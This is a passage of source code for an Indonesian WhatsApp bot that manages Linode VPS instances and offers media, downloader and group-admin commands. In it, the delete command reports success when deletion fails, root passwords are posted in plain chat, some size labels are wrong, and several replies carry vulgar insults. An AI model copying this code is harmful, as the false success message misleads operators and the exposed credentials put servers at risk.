thumbnail: thumb
}
}})
}
break
case "deletelinode": {
  if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');

  let linodeId = args[0];
  if (!linodeId) return m.reply('ID Linode belum diberikan.');

  let deleteLinode = async () => {
    try {
      let response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.status === 204) {
        reply('Linode berhasil dihapus.');
      } else {
        throw new Error('Gagal menghapus Linode.');
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus Linode:', error);
      reply('Sukses Menghapus Linode.');
    }
  };

  deleteLinode();

  break;
}
case "sisalinode": {
  if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`);

  async function getLinodeInfo() {
    try {
      const response = await fetch('https://api.linode.com/v4/account', {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`,
        },
      });

      if (response.ok) {
        const accountInfo = await response.json();
        const linodeLimit = accountInfo.data.active_promo?.total || 0;
        const linodesCount = accountInfo.data.active_promo?.remaining || 0;

        return {
          linodeLimit,
          remainingLinodes: linodesCount,
          totalLinodes: linodeLimit - linodesCount,
        };
      } else {
        throw new Error('Gagal mendapatkan data akun Linode.');
      }
    } catch (error) {
      throw error;
    }
  }

  // Definisikan fungsi untuk mengeksekusi kasus "sisalinode"
  async function sisalinodeHandler() {
    try {
      if (!isOwner) {
        return reply('Lu Siapanya Gua Anjg');
      }

      const linodeInfo = await getLinodeInfo();
      reply(`*Sisa VPS Linode Yang Dapat Anda Buat: ${linodeInfo.remainingLinodes}*

*Total VPS Linode Yang Sudah Terbuat: ${linodeInfo.totalLinodes}*`);
    } catch (error) {
      reply(`Terjadi kesalahan: ${error.message}`);
    }
  }

  sisalinodeHandler();
  break;
}

            
            
case "rebuildlinode": {
  if (!isOwner) return reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Anjg`);

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  let password = args[1]; // Mengambil password dari argumen kedua (jika ada)
  if (!password) return reply('Password belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild VPS menggunakan API Linode
      const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/rebuild`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        },
        body: JSON.stringify({
          image: 'linode/ubuntu20.04', // Ganti dengan ID atau label image yang ingin digunakan untuk rebuild
          root_pass: password // Menggunakan password yang diberikan
        })
      });

      if (response.ok) {
        reply('Rebuild VPS berhasil dimulai.');

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const ipAddress = vpsData.ipv4[0] || 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: Ubuntu 20.04\nPASSWORD: ${password}`;
          await sleep(60000);
          DitzzXploit.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.errors[0].reason);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error.message);
    }
  };

  rebuildVPS();
  break;
}

case "linode8gb": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: 'my-linode',
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-4', // Spesifikasi 8GB RAM 4 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await DitzzXploit.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
           
            
case "cekvps": {
  if (!isOwner) return reply('Maaf, perintah ini hanya untuk pemilik.');

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  // Mendapatkan informasi VPS Linode berdasarkan ID
  const getLinodeInfo = async (linodeId) => {
    try {
      const apiUrl = `https://api.linode.com/v4/linode/instances/${linodeId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.ok) {
        const linodeInfo = await response.json();

        const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode
        const ram = `${linodeInfo.specs.memory / 1024} GB`; // RAM VPS dalam GB
        const os = linodeInfo.image.distribution; // Nama OS
        const cpu = `${linodeInfo.specs.vcpus} vCPUs`; // Jumlah vCPUs
        const storage = linodeInfo.specs.disk; // Kapasitas penyimpanan
        const status = linodeInfo.status; // Status VPS

        const createDate = new Date(linodeInfo.created); // Tanggal pembuatan VPS
        const formattedCreateDate = createDate.toLocaleDateString();

        return {
          linodeid: linodeInfo.id,
          label: linodeInfo.label,
          ip: ipAddress,
          ram,
          os,
          cpu,
          storage,
          status,
          createDate: formattedCreateDate
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail Linode: ${errorData.errors[0].reason}`);
      }
    } catch (error) {
      throw new Error(`Terjadi kesalahan saat memeriksa detail Linode: ${error.message}`);
    }
  };

  getLinodeInfo(linodeId)
    .then((info) => {
      let textku = `*DETAIL VPS LINODE*\nLinode Id: ${info.linodeid}\nLabel: ${info.label}\nIP: ${info.ip}\nRAM: ${info.ram}\nOS: ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus: ${info.status}\nCreate On: ${info.createDate}\n`;
      DitzzXploit.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      DitzzXploit.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS Linode.' });
    });

  break;
}


            

case "linode2gb": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: 'my-linode',
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-1', // Spesifikasi 1GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await DitzzXploit.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
            
            
 case "linode4gb": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: 'my-linode',
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-2', // Spesifikasi 2GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await DitzzXploit.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;

            
case "saldolinode":
  if (!isOwner) return reply(mess.only.owner);

  // Endpoint untuk mengambil informasi saldo promosi Linode
  const linodePromotionsEndpoint = 'https://api.linode.com/v4/profile';

  // Konfigurasi untuk melakukan permintaan ke API Linode
  const config = {
    headers: {
      'Authorization': `Bearer ${LINODE_API_TOKEN}`
    }
  };

  // Mengambil informasi saldo promosi dari Linode
  axios.get(linodePromotionsEndpoint, config)
    .then(response => {
      // Periksa apakah saldo promosi tersedia dalam respons
      if (response.data && Array.isArray(response.data.data)) {
        // Saldo promosi dapat ada dalam elemen pertama jika ada
        const saldoPromosi = response.data.data[0].balance;
        const teksSaldo = `Sisa Kredit Promosi Linode Dalam Akun Anda Adalah $${saldoPromosi}`;
        reply(teksSaldo);
      } else {
        reply('Informasi saldo promosi tidak ditemukan atau akun tidak memiliki saldo promosi.');
      }
    })
    .catch(error => {
      console.error(error);
      reply('Terjadi kesalahan saat mengambil informasi saldo promosi.');
    });

  break;




        
case "resetpassword": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  let linodeId = args[0];
  let newPassword = args[1];
  
  if (!linodeId || !newPassword) {
    return reply("Format: !resetpassword [Linode ID] [New Password]");
  }
  
  // Periksa apakah kata sandi memenuhi persyaratan keamanan yang diharapkan
  if (newPassword.length < 8) {
    return reply("Kata sandi harus memiliki setidaknya 8 karakter.");
  }
  
  try {
    const resetPassword = async () => {
      try {
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/password`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          },
          body: JSON.stringify({ root_pass: newPassword })
        });
        
        if (response.ok) {
          reply(`Kata sandi VPS Linode ID ${linodeId} berhasil direset.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal mereset kata sandi VPS Linode: ${responseData.errors[0].reason}`);
        }
      } catch (error) {
        reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${error}`);
      }
    };
    
    resetPassword();
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${err}`);
  }
}
break;



        
    case 'listlinode': {
  if (!isOwner) return reply("Anda bukan pemilik.");

  try {
    const getLinodes = async () => {
      try {
        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });
        const data = await response.json();
        return data.data || [];
      } catch (error) {
        reply('Error fetching Linodes: ' + error);
        return [];
      }
    };

    getLinodes().then(linodes => {
      let totalvps = linodes.length;
      let message = `List VPS Linode Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (linodes.length === 0) {
        message += 'Tidak ada VPS yang tersedia.';
      } else {
        linodes.forEach(linode => {
          message += `- Linode Id: ${linode.id}\n- Label: ${linode.label}\n- Region: ${linode.region}\n- IP: ${linode.ipv4[0]}\n- Ram: ${linode.specs.memory / 1024} GB\n- Cpu: ${linode.specs.vcpus} CPU\n- Status: ${linode.status}\n- Harga: $\n▬▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      DitzzXploit.sendMessage(m.chat, { text: message });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data Linode: ' + err);
  }

  break;
}
     
        
 case "offlinode": {
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOffLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/shutdown`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Linode):', error.message);
    }
  }

  turnOffLinode();
  break;
}

case "onlinode": {
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOnLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/boot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang diaktifkan...');
      } else {
        reply('Gagal mengaktifkan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mengaktifkan VPS (Linode):', error.message);
    }
  }

  turnOnLinode();
  break;
}
case "rebootlinode": {
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function rebootLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/reboot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang direboot...');
      } else {
        reply('Gagal me-reboot VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat me-reboot VPS (Linode):', error.message);
    }
  }

  rebootLinode();
  break
  }
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
  let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
  if (!/image/.test(mime)) throw respond
  if (!text) throw respond
  reply(`Proses Tuan...`)
  let atas = text.split('|')[0] ? text.split('|')[0] : '-'
  let bawah = text.split('|')[1] ? text.split('|')[1] : '-'
  let { TelegraPh } = require('./freya/uploader')
  try {
  let mee = await DitzzXploit.downloadAndSaveMediaMessage(quoted)
  let mem = await TelegraPh(mee)
  let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
  let awikwok = await DitzzXploit.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
  await fs.unlinkSync(awikwok)
  } catch (e) {
  reply(`Sedang Maintenance Tuan`)
  }
  }
  break 

case  'ambilfitur':
            try{
                if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
                if (!q) return m.reply(`🚩 Example ${prefix + command} listmenu`)
                let nana = await getCase(q)
                m.reply(nana)
            } catch(err){
            console.log(err)
            m.reply(`🚩 Case ${q} tidak di temukan`)
        }
        break
case 'togif': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./freya/uploader')
let media = await DitzzXploit.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await DitzzXploit.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:m})
await fs.unlinkSync(media)
}
break
case 'toimg': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return reply(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await DitzzXploit.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            DitzzXploit.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return reply(`Please reply to non animated sticker`)
    }
    break
case 'tomp4': case 'tovideo': {
                if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
                if (!quoted) return reply('Reply to Sticker')
                if (!/webp/.test(mime)) return reply(`reply sticker with caption *${prefix + command}*`)
		        let { webp2mp4File } = require('./freya/uploader')
                let media = await DitzzXploit.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await DitzzXploit.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
case 'tourl': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./freya/uploader')
let media = await DitzzXploit.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'getbio':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await DitzzXploit.fetchStatus(who)
    reply(bio.status)
  } catch {
    if (text) return reply(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await DitzzXploit.fetchStatus(who)
      reply(bio.status)
    } catch {
      return reply(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break

case 'tiktokaudio':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./freya/tiktok').Tiktok(q).then( data => {
DitzzXploit.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'tiktok':{ 
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./freya/tiktok').Tiktok(q).then( data => {
DitzzXploit.sendMessage(m.chat, { caption: `Sukses, Ini Tuan Video Nya`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'mediafire': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
	if (args.length == 0) return reply(`Link Nya Tuan?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`The link you provided is invalid`)
	const { mediafireDl } = require('./freya/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 100) return reply('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
reply(`${result4}`)
DitzzXploit.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'listblock': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
	const lisben = "Total Ban: " + banUser.length
	reply(lisben)
	}
	break
case 'delete': case 'del': {
                if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
                if (!m.quoted) return false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return Reply('Pesan tersebut bukan dikirim oleh bot!')
                DitzzXploit.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'closetime': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
DitzzXploit.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
}
break
case 'opentime': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
DitzzXploit.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
}
break
case  'getcase':
const getCase = (cases) => {
         return "case  "+`'${cases}'`+fs.readFileSync("./appearance.js").toString().split('case \''+cases+'\'')[1].split("break")
}
break           
case 'totag': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isBotAdmins) return reply(mess.only.badmin)
               if (!m.quoted) return reply(`Reply message with caption ${prefix + command}`)
               DitzzXploit.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
case 'addip': case 'addpm2':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (args.length !== 1) {
return reply('Format penggunaan salah. Contoh: !addpm2 <ip>');
}
const ipValue = args[0];
const apiUrl = 'https://cekilhost.net/api/config';
axios.post(apiUrl, `ip=${ipValue}`)
.then(response => {
if (response.data.status === 'success') {
const successMessage = `Berhasil Mendaftar pm2 dengan IP: ${ipValue}`;
reply(successMessage);
} else {
const errorMessage = 'Terjadi kesalahan: ' + response.data.message;
reply(errorMessage);
}
})
.catch(error => {
console.error(error);
reply('Terjadi kesalahan saat mengirim permintaan.');
});
break
case 'sendlinkgc': case 'sendgc': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283183432282`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await DitzzXploit.groupInviteCode(from)
DitzzXploit.sendText(bnnd, `Order  Akses Bot? Join Gc\nhttps://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
sukses(from)
}
  break
case 'getpm2':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
DitzzXploit.sendMessage(from, {document: fs.readFileSync('./freya/pm2.json'), caption: 'Egg Pm2', mimetype: 'application/json', fileName: 'pm2.json'}, {quoted: m})
break
case 'getbot':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
DitzzXploit.sendMessage(from, {document: fs.readFileSync('./freya/Bot.json'), caption: 'Egg Bot', mimetype: 'application/json', fileName: 'Bot.json'}, {quoted: m})
break
case 'ambilcase':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
DitzzXploit.sendMessage(from, {document: fs.readFileSync('./freya/memek.js'), caption: 'Nih Kalo Mau Deck😜', mimetype: 'application/js', fileName: 'memek.js'}, {quoted: m})
break
case 'ambilsc1':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
DitzzXploit.sendMessage(from, {document: fs.readFileSync('./freya/Free1.zip'), caption: 'Nih Sc Nya, Dijual Yapit Kontol.', mimetype: 'application/zip', fileName: 'Free1.zip'}, {quoted: m})
break
case 'ambilsc2':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
DitzzXploit.sendMessage(from, {document: fs.readFileSync('./freya/Free2.zip'), caption: 'Nih Sc Nya, Dijual Yapit Kontol.', mimetype: 'application/zip', fileName: 'Free2.zip'}, {quoted: m})
break
case 'ambilsc3':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
DitzzXploit.sendMessage(from, {document: fs.readFileSync('./freya/Free3.zip'), caption: 'Nih Sc Nya, Dijual Yapit Kontol.', mimetype: 'application/zip', fileName: 'Free3.zip'}, {quoted: m})
break
case 'ambilsc4':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
DitzzXploit.sendMessage(from, {document: fs.readFileSync('./freya/Free4.zip'), caption: 'Nih Sc Nya, Dijual Yapit Kontol.', mimetype: 'application/zip', fileName: 'Free4.zip'}, {quoted: m})
break
case 'ambilsc5':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
DitzzXploit.sendMessage(from, {document: fs.readFileSync('./freya/Free5.zip'), caption: 'Nih Sc Nya, Dijual Yapit Kontol.', mimetype: 'application/zip', fileName: 'Free5.zip'}, {quoted: m})
break
case 'ambilsc6':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
DitzzXploit.sendMessage(from, {document: fs.readFileSync('./freya/Free6.zip'), caption: 'Nih Sc Nya, Dijual Yapit Kontol.', mimetype: 'application/zip', fileName: 'Free6.zip'}, {quoted: m})
break
case 'vidowner1':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let tekssss = `*Hallo Tuan*👋🏻
Video Diatas Adalah Cewe Idaman 
*${namaStore}*
`
DitzzXploit.sendMessage(from, { video: fs.readFileSync(`./testimoni/video.mp4`),
 caption: tekssss, 
footer: `MILIK *${ownerStore}*`},
{quoted: fkontak})
}
break
case 'pesan': case 'buyer': {
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
if (!args || !args[0]) return reply(`🚩 Please enter the message\nExample of Use: ${prefix + command} ${owner} pesan untuknya`)
let ngen = ['|']
if (args[0].includes(ngen)) return reply('Replace Symbol | So spaces')
if (args[0].length > 14) return reply('Extension Number')
if (args[0].length < 7) return reply('Abbreviation Number')
if (args[0].startsWith('0')) return reply('Use format 62')
if (!args[0]) return reply('Masukkan Teks')
let mention = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[0] ? (args[0].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
let txt = (args.length > 1 ? args.slice(1).join(' ') : '') || ''
let q = m.quoted ? m.quoted : m
let mime = (q.m || q).mimetype || ''
